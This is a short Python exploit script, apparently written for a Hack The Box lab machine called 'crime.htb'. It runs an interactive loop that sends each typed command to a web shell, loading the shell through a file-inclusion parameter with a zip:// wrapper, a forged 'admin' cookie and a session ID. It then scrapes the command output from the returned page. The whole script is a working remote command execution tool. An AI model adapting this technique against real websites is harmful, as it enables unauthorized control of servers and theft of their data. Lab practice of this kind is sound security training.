#!/usr/bin/python3

import requests
import re
from pwn import *

cookies = {"admin":"1","PHPSESSID":"vc80s075m85k4i84pc2bo03u36"}
proxies = {"http":"http://127.0.0.1:8080"}

while(True): 
	user_input = input("Enter command > ")
	payload = str(user_input)
	print(payload)
	url = f"http://crime.htb/index.php?op=zip://uploads/10.10.14.65/bc7fd165bd3d1e88302f1299536fd63072b22eeb%23shell&cmd={payload}"
	r = requests.get(url,cookies=cookies,proxies=proxies)
	resposne = r.text
	# print(resposne)
	result = result=re.findall(r'</nav>\n\n(.*)<footer>',resposne,re.DOTALL)[0]
	log.progress(result)